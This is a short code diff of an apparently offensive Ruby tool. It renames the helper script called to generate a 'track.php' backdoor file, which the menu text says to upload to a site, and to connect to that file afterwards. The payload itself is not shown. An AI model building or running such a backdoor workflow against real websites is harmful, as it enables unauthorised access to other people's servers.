@@ -513,7 +513,7 @@ while true do
                            print "GENERATE >>".green
                            backdoor = gets.chomp
                            if backdoor == "1" then 
-                    system("ruby BWA.rb track.php ")
+                    system("ruby main.rb track.php ")
                     print "track.php File Has been generated Upload it to site ( D'ont change the name) !"
                     system("pause")
                            elsif backdoor == "2"
@@ -521,7 +521,7 @@ while true do
                             puts  " Sure To Use #{$url}/track.php site y/n : "
                             
                         elsif backdoor == "y" 
-                            system("ruby BWA.rb start #{$url}/track.php")
+                            system("ruby main.rb start #{$url}/track.php")
                              elsif backdoor == "n"
                                              break
                             
